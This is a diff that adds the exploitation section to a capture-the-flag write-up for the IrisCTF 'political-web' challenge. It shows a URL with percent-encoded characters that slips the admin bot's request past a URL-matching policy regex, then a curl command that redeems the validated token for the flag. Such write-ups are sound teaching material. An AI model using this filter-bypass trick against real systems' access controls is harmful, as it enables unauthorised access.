@@ -364,3 +364,33 @@ The challenge bot has its cookie set on `https://political-web.chal.irisc.tf`.
 ### EXPLOITATION
 
 ---------------
+
+- I urlencoded some of the url's characters to prevent the policy from matching the regex as seen below.I urlencoded char `f` in `giveflag` and `t` in `token`.The bot will make a request to `giveflag` to validate our token since it has the admin cookie and set it to `true` in the server.Later,we can redeem our flag.
+
+```
+https://political-web.chal.irisc.tf/give%66lag?%74oken=<token>
+```
+
+- Grabbed my token
+
+![image](https://github.com/user-attachments/assets/cc43f9ca-b64f-4865-a765-da6742cdec0d)
+
+- Make an admin request with the bot
+
+![image](https://github.com/user-attachments/assets/94238dbe-93a8-480a-80b0-3040fe6a1901)
+
+- Redeem the flag
+
+```bash
+❯ curl https://political-web.chal.irisc.tf/redeem -d "token=501ad20a1ebe705cad85011197db3920"
+irisctf{flag_blocked_by_admin}
+```
+
+- Flag-:`irisctf{flag_blocked_by_admin}`
+
+----------------
+
+### THANS FOR READING 
+
+---------------
+
